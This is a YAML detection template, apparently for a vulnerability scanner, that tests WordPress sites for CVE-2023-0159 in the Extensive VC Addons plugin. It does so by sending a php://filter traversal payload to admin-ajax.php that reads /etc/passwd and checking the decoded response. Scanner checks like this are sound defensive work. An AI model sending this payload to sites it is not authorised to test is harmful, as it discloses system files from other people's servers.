name: yaml-poc-wprealize-extensive_vc_addons_for_wpbakery_page_builder-directory_traversal-CVE-2023-0159
binding: e7dfd6bc-caa2-4f0b-9a59-787a0b0d50ca
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/239ea870-66e5-4754-952e-74d4dd60b809
    vulnerability:
        id: 02120280-979b-4dfd-98bc-815d6ddd6593
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=/etc/passwd
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains('{"status":"success","message":"Items are loaded"') && "root:.*?:[0-9]*:[0-9]*:".matches(base64Decode('data":"(?P<passwd>.+?)"'.bsubmatch(response.body)["passwd"]))
expression: r0()
